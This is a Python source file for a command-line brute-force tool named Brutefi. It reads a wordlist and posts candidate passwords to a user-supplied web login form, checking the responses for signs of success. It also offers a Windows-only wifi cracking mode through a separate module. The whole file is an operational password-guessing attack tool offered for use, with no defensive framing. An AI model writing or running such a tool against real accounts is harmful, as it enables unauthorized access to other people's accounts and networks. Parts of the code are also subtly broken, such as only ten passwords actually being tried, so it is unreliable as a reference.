# Author : Hunter87
# Github : https://github.com/hunter87ff
# Insta  : https://instagram.com/im_hunter87
# Youtube: https://youtube.com/@hunter87
lgr='\033[1;32m' 
red='\033[0;31m' 
cyan='\033[36m' 
blue='\033[34m'
NC='\033[0m'

try:
	import os, sys, time, brutewf, threading, platform
	import requests as req
except ImportError: os.system("pip install -r requirements.txt")


banner = f"""{red}
  ____             _        __ _ 
 | __ ) _ __ _   _| |_ ___ / _(_)
 |  _ \| '__| | | | __/ _ \ |_| |
 | |_) | |  | |_| | ||  __/  _| |
 |____/|_|   \__,_|\__\___|_| |_|            
        	{lgr}-By Hunter87ff 
{NC}"""
print(banner)

dec = input("Enter web/wifi : ")

if dec.lower()=="web":
    def is_incorrect(res:req.Response, ses:bool) -> bool:
            if res.headers.get("Set-Cookie"):return False
            if res.cookies.get("token")==None:return True
            if res.status_code!=200:return True
            if ses==True and "window.location" in res.text:return False
            error = ["incorrect", "wrong", "invalid", "not found", "login", "failed"]
            for err in error:
                if err in res.text.lower():
                    return True
            return False

    def crack(method:str, url, target, dest, passw, psw):
        count = 1
        ses = False
        for i in psw:
            data = {f"{target}":f"{dest}", f"{passw}":f"{i}", "login":"Login"}
            if method.lower()=="session":
                sess = req.Session()
                sess.post(url, data)
                res = sess.get(url)
                ses = True
            else:
                res = req.post(url, data, timeout=1)
            if is_incorrect(res, ses):
                print(f"{count}) Failed {i}")
            else:
                print(f"{lgr}Password Is : {i}{NC}")
                return True
            count += 1
    def web():
        url = input("Enter Url : ")
        method = input("Enter Method (eg: sesstion, post) : ")
        target = input("Target (eg: email, username): ")
        dest = input("Target destination (eg: hunter87, h87@hunter87.io): ")
        passw = input("Password parameter (eg: pass, psw, password) :")
        chunk = 10000
        load = f"""{red}Starting Attack : 
    █████████████████████████████████████████████████\n"""
        for x in load:
            sys.stdout.write(x)
            sys.stdout.flush()
            time.sleep(0.02)
        with open("passwords.txt", "r") as f:
            passwords = f.read().split("\n")[0:chunk]
            t = threading.Thread(target=crack, args=(method, url, target, dest, passw, passwords[0:10],))
            t.start()
    web()

####WIFI####
if dec.lower()=="wifi":
	if "windows" not in platform.system().lower():
		print(f"{red}Wifi module only works on windows{NC}")
		sys.exit()
	brutewf.main()
